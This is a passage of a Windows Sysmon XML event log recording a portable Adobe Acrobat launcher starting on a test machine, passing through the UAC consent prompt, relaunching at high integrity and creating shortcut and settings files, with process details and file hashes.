+CreationUtcTime: 2019-11-14 08:00:12.852</Message><Level>Information</Level><Task>File created (rule: FileCreate)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:30:35.507100500Z'/><EventRecordID>37351</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-11-14 09:30:35.499</Data><Data Name='ProcessGuid'>{49926e27-1eba-5dcd-0000-0010c2722801}</Data><Data Name='ProcessId'>6304</Data><Data Name='Image'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe</Data><Data Name='TargetFilename'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\Data\Locale.lnk</Data><Data Name='CreationUtcTime'>2019-11-14 08:00:11.400</Data></EventData><RenderingInfo Culture='en-US'><Message>File created:
+RuleName: 
+UtcTime: 2019-11-14 09:30:35.499
+ProcessGuid: {49926e27-1eba-5dcd-0000-0010c2722801}
+ProcessId: 6304
+Image: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe
+TargetFilename: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\Data\Locale.lnk
+CreationUtcTime: 2019-11-14 08:00:11.400</Message><Level>Information</Level><Task>File created (rule: FileCreate)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:30:35.486702100Z'/><EventRecordID>37350</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-11-14 09:30:35.484</Data><Data Name='ProcessGuid'>{49926e27-1eba-5dcd-0000-0010c2722801}</Data><Data Name='ProcessId'>6304</Data><Data Name='Image'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe</Data><Data Name='TargetFilename'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\Data\Dictionaries.lnk</Data><Data Name='CreationUtcTime'>2019-11-14 08:00:11.195</Data></EventData><RenderingInfo Culture='en-US'><Message>File created:
+RuleName: 
+UtcTime: 2019-11-14 09:30:35.484
+ProcessGuid: {49926e27-1eba-5dcd-0000-0010c2722801}
+ProcessId: 6304
+Image: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe
+TargetFilename: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\Data\Dictionaries.lnk
+CreationUtcTime: 2019-11-14 08:00:11.195</Message><Level>Information</Level><Task>File created (rule: FileCreate)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:30:35.411042200Z'/><EventRecordID>37349</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-11-14 09:30:35.407</Data><Data Name='ProcessGuid'>{49926e27-1eba-5dcd-0000-0010c2722801}</Data><Data Name='ProcessId'>6304</Data><Data Name='Image'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe</Data><Data Name='TargetFilename'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\Data\PortableApps.comLauncherRuntimeData-AcrobatPortable.ini</Data><Data Name='CreationUtcTime'>2019-11-14 09:30:35.407</Data></EventData><RenderingInfo Culture='en-US'><Message>File created:
+RuleName: 
+UtcTime: 2019-11-14 09:30:35.407
+ProcessGuid: {49926e27-1eba-5dcd-0000-0010c2722801}
+ProcessId: 6304
+Image: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe
+TargetFilename: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\Data\PortableApps.comLauncherRuntimeData-AcrobatPortable.ini
+CreationUtcTime: 2019-11-14 09:30:35.407</Message><Level>Information</Level><Task>File created (rule: FileCreate)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:30:34.839624800Z'/><EventRecordID>37348</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-11-14 09:30:34.826</Data><Data Name='ProcessGuid'>{49926e27-1eba-5dcd-0000-0010c2722801}</Data><Data Name='ProcessId'>6304</Data><Data Name='Image'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe</Data><Data Name='FileVersion'>15.009.20079.0</Data><Data Name='Description'>Adobe Acrobat DC Lite™</Data><Data Name='Product'>Adobe Acrobat DC Lite™</Data><Data Name='Company'>Adobe Systems Incorporated</Data><Data Name='OriginalFileName'>AcrobatPortable.exe</Data><Data Name='CommandLine'>"C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe" /UAC:3207B0 /NCRC </Data><Data Name='CurrentDirectory'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\</Data><Data Name='User'>WINDEV1910EVAL\User</Data><Data Name='LogonGuid'>{49926e27-fdfa-5dcc-0000-0020b3530300}</Data><Data Name='LogonId'>0x353b3</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=67757B423F6EF54D3A5EABD2C7E8EBEA,SHA256=2CBD084A0C4F606D52B29411CDD5A67E96E360751D0724B9E6E0EFAD1939D64E</Data><Data Name='ParentProcessGuid'>{49926e27-1eb7-5dcd-0000-00102b342801}</Data><Data Name='ParentProcessId'>5496</Data><Data Name='ParentImage'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe</Data><Data Name='ParentCommandLine'>"C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe" </Data></EventData><RenderingInfo Culture='en-US'><Message>Process Create:
+RuleName: 
+UtcTime: 2019-11-14 09:30:34.826
+ProcessGuid: {49926e27-1eba-5dcd-0000-0010c2722801}
+ProcessId: 6304
+Image: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe
+FileVersion: 15.009.20079.0
+Description: Adobe Acrobat DC Lite™
+Product: Adobe Acrobat DC Lite™
+Company: Adobe Systems Incorporated
+OriginalFileName: AcrobatPortable.exe
+CommandLine: "C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe" /UAC:3207B0 /NCRC 
+CurrentDirectory: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\
+User: WINDEV1910EVAL\User
+LogonGuid: {49926e27-fdfa-5dcc-0000-0020b3530300}
+LogonId: 0x353B3
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=67757B423F6EF54D3A5EABD2C7E8EBEA,SHA256=2CBD084A0C4F606D52B29411CDD5A67E96E360751D0724B9E6E0EFAD1939D64E
+ParentProcessGuid: {49926e27-1eb7-5dcd-0000-00102b342801}
+ParentProcessId: 5496
+ParentImage: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe
+ParentCommandLine: "C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe" </Message><Level>Information</Level><Task>Process Create (rule: ProcessCreate)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:30:32.570634700Z'/><EventRecordID>37347</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-11-14 09:30:32.561</Data><Data Name='ProcessGuid'>{49926e27-1eb8-5dcd-0000-001087482801}</Data><Data Name='ProcessId'>3492</Data><Data Name='Image'>C:\Windows\System32\consent.exe</Data><Data Name='FileVersion'>10.0.18362.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Consent UI for administrative applications</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>consent.exe</Data><Data Name='CommandLine'>consent.exe 1012 612 0000014ACBF772D0</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{49926e27-9899-5dcd-0000-0020e7030000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=EE2A1C85C472F89B146CC8EE598CCCBC,SHA256=19FD0010DA92B654D1CA270247061A39EA13C0A58529FD8257A97E2EF7794911</Data><Data Name='ParentProcessGuid'>{00000000-0000-0000-0000-000000000000}</Data><Data Name='ParentProcessId'>1012</Data><Data Name='ParentImage'>?</Data><Data Name='ParentCommandLine'>?</Data></EventData><RenderingInfo Culture='en-US'><Message>Process Create:
+RuleName: 
+UtcTime: 2019-11-14 09:30:32.561
+ProcessGuid: {49926e27-1eb8-5dcd-0000-001087482801}
+ProcessId: 3492
+Image: C:\Windows\System32\consent.exe
+FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
+Description: Consent UI for administrative applications
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: consent.exe
+CommandLine: consent.exe 1012 612 0000014ACBF772D0
+CurrentDirectory: C:\Windows\system32\
+User: NT AUTHORITY\SYSTEM
+LogonGuid: {49926e27-9899-5dcd-0000-0020e7030000}
+LogonId: 0x3E7
+TerminalSessionId: 1
+IntegrityLevel: System
+Hashes: MD5=EE2A1C85C472F89B146CC8EE598CCCBC,SHA256=19FD0010DA92B654D1CA270247061A39EA13C0A58529FD8257A97E2EF7794911
+ParentProcessGuid: {00000000-0000-0000-0000-000000000000}
+ParentProcessId: 1012
+ParentImage: ?
+ParentCommandLine: ?</Message><Level>Information</Level><Task>Process Create (rule: ProcessCreate)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:30:32.009403800Z'/><EventRecordID>37346</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-11-14 09:30:31.997</Data><Data Name='ProcessGuid'>{49926e27-1eb7-5dcd-0000-00102b342801}</Data><Data Name='ProcessId'>5496</Data><Data Name='Image'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe</Data><Data Name='FileVersion'>15.009.20079.0</Data><Data Name='Description'>Adobe Acrobat DC Lite™</Data><Data Name='Product'>Adobe Acrobat DC Lite™</Data><Data Name='Company'>Adobe Systems Incorporated</Data><Data Name='OriginalFileName'>AcrobatPortable.exe</Data><Data Name='CommandLine'>"C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe" </Data><Data Name='CurrentDirectory'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\</Data><Data Name='User'>WINDEV1910EVAL\User</Data><Data Name='LogonGuid'>{49926e27-fdfa-5dcc-0000-0020e1530300}</Data><Data Name='LogonId'>0x353e1</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=67757B423F6EF54D3A5EABD2C7E8EBEA,SHA256=2CBD084A0C4F606D52B29411CDD5A67E96E360751D0724B9E6E0EFAD1939D64E</Data><Data Name='ParentProcessGuid'>{49926e27-fe01-5dcc-0000-0010f9490400}</Data><Data Name='ParentProcessId'>3468</Data><Data Name='ParentImage'>C:\Windows\explorer.exe</Data><Data Name='ParentCommandLine'>C:\Windows\Explorer.EXE</Data></EventData><RenderingInfo Culture='en-US'><Message>Process Create:
+RuleName: 
+UtcTime: 2019-11-14 09:30:31.997
+ProcessGuid: {49926e27-1eb7-5dcd-0000-00102b342801}
+ProcessId: 5496
+Image: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe
+FileVersion: 15.009.20079.0
+Description: Adobe Acrobat DC Lite™
+Product: Adobe Acrobat DC Lite™
+Company: Adobe Systems Incorporated
+OriginalFileName: AcrobatPortable.exe
+CommandLine: "C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe" 
+CurrentDirectory: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\
+User: WINDEV1910EVAL\User
+LogonGuid: {49926e27-fdfa-5dcc-0000-0020e1530300}
+LogonId: 0x353E1
+TerminalSessionId: 1
+IntegrityLevel: Medium
+Hashes: MD5=67757B423F6EF54D3A5EABD2C7E8EBEA,SHA256=2CBD084A0C4F606D52B29411CDD5A67E96E360751D0724B9E6E0EFAD1939D64E
+ParentProcessGuid: {49926e27-fe01-5dcc-0000-0010f9490400}
+ParentProcessId: 3468
+ParentImage: C:\Windows\explorer.exe
+ParentCommandLine: C:\Windows\Explorer.EXE</Message><Level>Information</Level><Task>Process Create (rule: ProcessCreate)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event></Events>
